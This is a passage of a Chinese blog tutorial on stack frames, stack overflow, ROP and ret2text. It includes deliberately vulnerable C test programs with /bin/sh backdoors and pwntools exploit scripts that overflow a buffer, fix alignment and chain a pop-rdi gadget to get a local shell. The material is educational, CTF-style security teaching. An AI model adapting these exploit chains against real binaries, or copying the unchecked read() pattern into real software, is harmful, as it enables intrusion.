+<p>接下来开始执行累加指令，先将寄存器中存储的参数写到栈上，然后依次将参数取出放到<strong>edx和eax</strong>中计算，最后结果存储到eax中。实际上这个函数没有什么内部的变量，因此不需要开辟一片空间去专门存储数据，栈帧始终是空的。</p>
+
+<h3 class="relative group">函数返回、栈帧销毁
+    <div id="函数返回栈帧销毁" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#%e5%87%bd%e6%95%b0%e8%bf%94%e5%9b%9e%e6%a0%88%e5%b8%a7%e9%94%80%e6%af%81" aria-label="锚点">#</a>
+    </span>
+    
+</h3>
+<p>函数返回时，先<strong>将rbp弹出</strong>，由于<code>add</code>函数的栈帧是空的，rsp指向的就是旧的rbp，直接<code>pop rbp</code>弹出即可；如果像<code>main</code>函数一样，栈帧内有数据，rsp没有立刻指向该值，则用<code>leave</code>指令，该指令可以看作<code>mov rsp, rbp; pop rbp</code>两个指令，先让rsp指向该值，再弹出该值。</p>
+<p>接下来<code>ret</code>，其本质为<code>pop rip</code>，也就是将存储的返回地址弹出到rip中，从而改变控制流，回到上一个函数。</p>
+<p>由于add函数通过栈传递了一些参数，而现在用不到这个参数，在<code>gadget 4</code><strong>回收栈空间</strong>，因此<code>add rsp, 8</code>，将存储参数7空间排出栈帧空间，栈帧布局如下：</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="栈帧布局"
+    width="497"
+    height="804"
+    src="/posts/pwn/ret2text/resources/image5.png"
+    srcset="/posts/pwn/ret2text/resources/image5.png 800w, /posts/pwn/ret2text/resources/image5.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/posts/pwn/ret2text/resources/image5.png"></figure>
+<p>接下来设置rax为0，即main函数返回值，然后弹出旧rbp和返回地址，回到start函数，之后程序执行结束正常退出。</p>
+
+<h2 class="relative group">栈溢出
+    <div id="栈溢出" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#%e6%a0%88%e6%ba%a2%e5%87%ba" aria-label="锚点">#</a>
+    </span>
+    
+</h2>
+<p>根据上面的流程，一句话总结栈帧的特点：<strong>栈帧内部存储函数的局部变量，高处存储rbp的缓存值和返回地址</strong>，在C语言代码中看起来每个变量都是分开来的，但实际在内存中所有数据都挨到一起，<strong>没有隔断</strong>。那么操作某一处数据时有没有可能会影响到其他的数据，造成一些不可控的后果呢？</p>
+<p>我们先测试一下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp"># include &lt;stdio.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">a</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">;</span> <span class="n">i</span> <span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%#x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>很明显i越界了，但是程序依然能跑，这说明程序<strong>不会检查</strong>你操作某一处数据时会不会影响其他数据：</p>
+<pre tabindex="0"><code class="language-terminal" data-lang="terminal">$ ./test
+0x1
+0x2
+0x3
+0x4
+0x3a83dc30
+0x7ffd
+</code></pre><p>那么只要程序提供了这个机会，我们就可以实现<strong>栈上其他数据的泄露和改写</strong>，进而造成一些安全问题，比如下面这个例子：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// gcc -fno-stack-protector -no-pie -z lazy -O0 test.c -o test
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="cp"># include &lt;stdio.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">a</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">b</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Success!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>理论上我们无法修改b的值，但是发现我们可以向长度为0x10的缓冲区<code>a</code>写入0x20个字符，过量写入有没有可能影响到b的值呢？将程序拖入ida观察栈空间分布：</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="栈空间分布"
+    width="904"
+    height="235"
+    src="/posts/pwn/ret2text/resources/image6_hu_df71f61afa4a529.png"
+    srcset="/posts/pwn/ret2text/resources/image6_hu_df71f61afa4a529.png 800w, /posts/pwn/ret2text/resources/image6.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/posts/pwn/ret2text/resources/image6.png"></figure>
+<p>（为什么缓冲区大小变成了28？这是因为十六进制对齐，在a和b间插入了12字节对齐，但是数据之间没有隔断，因此ida将这12字节也当作缓冲区了）</p>
+<p>以rbp为基准，发现缓冲区a的起始位置位于+0x20，b位于+4，那么我们只要写入大于28个字符即可覆盖b的值。我们试一下：</p>
+<pre tabindex="0"><code class="language-terminal" data-lang="terminal">$ ./test
+01234567890123456789123456781
+Success!
+</code></pre><p>当b不为0时程序只打印一句话，但如果程序不只打印一句话，而是有一些别的更危险的操作，后果不堪设想；当然这里只是修改了一个局部变量，如果修改别的东西，比如存储的返回地址和rbp值，后果会更加严重，<em>很可怕吗？是的很可怕。</em></p>
+
+<h2 class="relative group">ROP（返回导向编程）
+    <div id="rop返回导向编程" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#rop%e8%bf%94%e5%9b%9e%e5%af%bc%e5%90%91%e7%bc%96%e7%a8%8b" aria-label="锚点">#</a>
+    </span>
+    
+</h2>
+<p>ROP正是这样一种攻击方式，其通过输入漏洞向栈上写入大量数据，修改栈上返回地址，从而控制执行流，在安全防御机制下执行恶意代码。将返回地址修改为指定地址，在函数执行<code>ret</code>时就会将该指定值弹出给rip。根据返回目的的不同，基础的ROP可以分为如下几类：</p>
+<ul>
+<li>
+<p>ret2text：返回到程序的<code>.text</code><strong>节</strong>，这些程序中一般具有一个无法调用的后门函数，攻击的目的是跳转到后门函数。</p>
+</li>
+<li>
+<p>ret2libc：返回到程序的<strong>C库</strong>中，通过利用C库中大量的代码片段实现目的。</p>
+</li>
+<li>
+<p>ret2syscall：返回到程序的<strong>系统调用句</strong>，通过控制调用号执行任意系统调用。</p>
+</li>
+<li>
+<p>ret2shellcode：返回到<strong>注入程序中的恶意代码</strong>，通过构造恶意代码并跳转进行攻击。</p>
+</li>
+</ul>
+<p>除此之外，还有ret2csu、ret2dlresolve、ret2vDSO、SROP、BROP等攻击方式，也有不通过<code>ret</code>句，而是围绕<code>call</code>、<code>jmp</code>等句的COP、JOP等攻击方式，不过这些方式都需要<strong>通过漏洞控制执行流</strong>，而<strong>栈溢出是最主要的一种漏洞利用</strong>。</p>
+
+<h2 class="relative group">ret2text
+    <div id="ret2text" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#ret2text" aria-label="锚点">#</a>
+    </span>
+    
+</h2>
+<p>下面介绍最简单的ROP &mdash; ret2text。有如下一段代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// gcc -fno-stack-protector -no-pie -z lazy -O0 test.c -o test
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="cp"># include &lt;stdio.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp"># include &lt;unistd.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp"># include &lt;stdlib.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">backdoor</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>理论上无法调用后门函数，但发现可以向<code>buffer</code>写入过量数据造成溢出，这时我们需要通过溢出修改返回地址，跳转到后门函数。通过ida观察栈空间分布和后门函数如下：</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="栈空间分布"
+    width="570"
+    height="106"
+    src="/posts/pwn/ret2text/resources/image7.png"
+    srcset="/posts/pwn/ret2text/resources/image7.png 800w, /posts/pwn/ret2text/resources/image7.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/posts/pwn/ret2text/resources/image7.png"></figure>
+
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="后门函数"
+    width="807"
+    height="381"
+    src="/posts/pwn/ret2text/resources/image8_hu_788c94d15d80459e.png"
+    srcset="/posts/pwn/ret2text/resources/image8_hu_788c94d15d80459e.png 800w, /posts/pwn/ret2text/resources/image8.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/posts/pwn/ret2text/resources/image8.png"></figure>
+</p>
+<p>我们需要写满16字节缓冲区，外加8字节rbp存储区，才能修改到返回地址，因此我们<strong>先发送24字节的任意数据，再找到后门函数地址包装成8字节数据写入</strong>。</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="栈溢出示意"
+    width="501"
+    height="255"
+    src="/posts/pwn/ret2text/resources/image9.png"
+    srcset="/posts/pwn/ret2text/resources/image9.png 800w, /posts/pwn/ret2text/resources/image9.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/posts/pwn/ret2text/resources/image9.png"></figure>
+<p>exp如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x0000000000401156</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>尝试运行，发现不太对劲：</p>
+<pre tabindex="0"><code class="language-terminal" data-lang="terminal">$ python3 1.py
+[+] Starting local process &#39;./test&#39;: pid 5548
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive
+$ whoami
+[*] Process &#39;./test&#39; stopped with exit code -11 (SIGSEGV) (pid 5548)
+[*] Got EOF while sending in interactive
+</code></pre>
+<h3 class="relative group">16进制对齐
+    <div id="16进制对齐" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#16%e8%bf%9b%e5%88%b6%e5%af%b9%e9%bd%90" aria-label="锚点">#</a>
+    </span>
+    
+</h3>
+<p>出现这种情况说明并没有成功执行后门函数内的语句，我们尝试附加调试器，跟踪一下看看出现了什么问题：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">io</span><span class="o">.</span><span class="n">poll</span><span class="p">()</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span> <span class="c1"># 由于一启动程序就附加调试器，可能附加过早导致失败，该if句在检测到进程正常运行后才会执行附加</span>
+</span></span><span class="line"><span class="cl">        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pause</span><span class="p">()</span> <span class="c1"># 附加后暂停程序方便检查</span>
+</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x0000000000401156</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">check</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>发现在<code>&lt;do_system+363&gt;</code>出现问题，报错信息为<strong>not aligned to 16 bytes</strong>。</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="调试信息"
+    width="1285"
+    height="394"
+    src="/posts/pwn/ret2text/resources/image10_hu_28e76f4435b8ee40.png"
+    srcset="/posts/pwn/ret2text/resources/image10_hu_28e76f4435b8ee40.png 800w, /posts/pwn/ret2text/resources/image10_hu_dd8cc6d00ad34d50.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/posts/pwn/ret2text/resources/image10.png"></figure>
+<p>出现问题的原因是64位ubuntu18以上系统调用<code>system</code>函数时需要<strong>16进制栈对齐</strong>，也就是说，当我们正式调用<code>system</code>函数时，该函数地址存储的地址末尾必须为0。在x64的架构中，每一个“内存格”都是64bit（8字节），我们注意到<code>backdoor</code>中的序言<code>push rbp</code>会将8字节的数据压入栈中，破坏对齐，<strong>跳过这串指令</strong>即可对齐。</p>
+<p>更新的exp如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x000000000040115B</span> <span class="c1"># 跳过了push rbp</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><pre tabindex="0"><code class="language-terminal" data-lang="terminal">$ python3 1.py
+[+] Starting local process &#39;./test&#39;: pid 7285
+[*] Switching to interactive mode
+$ whoami
+kioroshiaki
+</code></pre>
+<h3 class="relative group">ROP链传参
+    <div id="rop链传参" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#rop%e9%93%be%e4%bc%a0%e5%8f%82" aria-label="锚点">#</a>
+    </span>
+    
+</h3>
+<p>在上面的例子中，后门函数直接指定了执行<code>/bin/sh</code>命令，但是有时候，执行什么命令也得由我们<strong>自己决定</strong>，比如下面这段代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// gcc -fno-stack-protector -no-pie -z lazy -O0 test.c -o test
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="cp"># include &lt;stdio.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp"># include &lt;unistd.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp"># include &lt;stdlib.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">binsh</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;/bin/sh</span><span class="se">\x00</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">backdoor</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">command</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">asm</span><span class="p">(</span><span class="s">&#34;pop %rdi; ret&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>可以看到，后门函数需要手动传入命令作为参数，程序中也刚好有这串字符串，根据上面提到的函数调用时参数的存储位置，命令字符串的地址作为第一个参数，应当传入rdi寄存器，而程序中也正好内联了一个<code>pop rdi; ret</code>的指令，让我们传参，那么如何溢出，做到先传参后跳转呢？这里就需要设计一个<strong>ROP链</strong>，它的结构是这样的：</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="ROP链"
+    width="568"
+    height="392"
+    src="/posts/pwn/ret2text/resources/image11.png"
+    srcset="/posts/pwn/ret2text/resources/image11.png 800w, /posts/pwn/ret2text/resources/image11.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/posts/pwn/ret2text/resources/image11.png"></figure>
+<p>我们分析一下设计原理：溢出后程序会先跳转到<code>pop rdi</code>完成传参，因此在跳转地址后需要紧跟rdi数据，之后执行<code>ret</code>指令，如果我们再加上后门函数的地址，就可以达到传参后跳转的作用，示意图如下：</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="示意图"
+    width="613"
+    height="385"
+    src="/posts/pwn/ret2text/resources/image12.png"
+    srcset="/posts/pwn/ret2text/resources/image12.png 800w, /posts/pwn/ret2text/resources/image12.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/posts/pwn/ret2text/resources/image12.png"></figure>
+<p>看起来像一个链表，每个节点都有<strong>一个指针和一个数据</strong>，只不过有时候数据是空的，如此就能做到多次劫持控制流，达成自己的目的，我们调试一下，脚本如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x0000000000404020</span>
+</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x000000000040116D</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000401175</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><pre tabindex="0"><code class="language-terminal" data-lang="terminal">$ python3 1.py
+[+] Starting local process &#39;./test&#39;: pid 2947
+[*] Switching to interactive mode
+$ whoami
+kioroshiaki
+</code></pre>
+<h2 class="relative group">后记
+    <div id="后记" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#%e5%90%8e%e8%ae%b0" aria-label="锚点">#</a>
+    </span>
+    
+</h2>
+<p>本篇文章讲述了栈溢出的基础知识，包括栈结构、栈溢出原理、ROP的概念、ret2text，老实说知识点挺碎的，我已经尽我所能把他们串到一起了。。</p>
+<p>那么ret2text的攻击方式是跳转到程序中的后门函数，但是如果程序没有后门函数那怎么办？我们仍然有机会通过ROP链创造攻击条件，比如ret2libc，详细原理会在下一篇讲到。</p>
+
+          
+          
+          
+            <strong class="block mt-8">
+              <a
+                target="_blank"
+                class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+                href="mailto:EndotherminUnit2@outlook.com?subject=Reply%20to%20%e6%a0%88%e5%b8%a7%e3%80%81%e6%a0%88%e6%ba%a2%e5%87%ba%e3%80%81ROP%e3%80%81ret2text">
+                通过邮件回复
+              </a>
+            </strong>
+          
+        </div>
+        
+        
+  <details class="mt-2 mb-5 overflow-hidden rounded-lg ms-0 ps-5">
+    
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 -ms-5 ps-5 dark:bg-primary-800 dark:text-neutral-100">
+    Pwn -
+    这篇文章属于一个选集。
+  </summary>
+  
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+        <a href="/posts/pwn/pwntools/">
+          § 1:
+          Python Pwntools的基础使用方法
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+        <a href="/posts/pwn/elf-basic/">
+          § 2:
+          ELF、内存装载、栈与寄存器
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+        § 3:
+        本文
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+        <a href="/posts/pwn/pivot/">
+          § 7:
+          栈迁移
+        </a>
+      </div>
+    
+  
+
+
+  </details>
+
+
+        
+
+        
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_posts/pwn/ret2text/index.md"
+          data-oid-likes="likes_posts/pwn/ret2text/index.md"></script>
+      
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="返回顶部"
+    title="返回顶部">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          KioroshiAki
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        由 <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
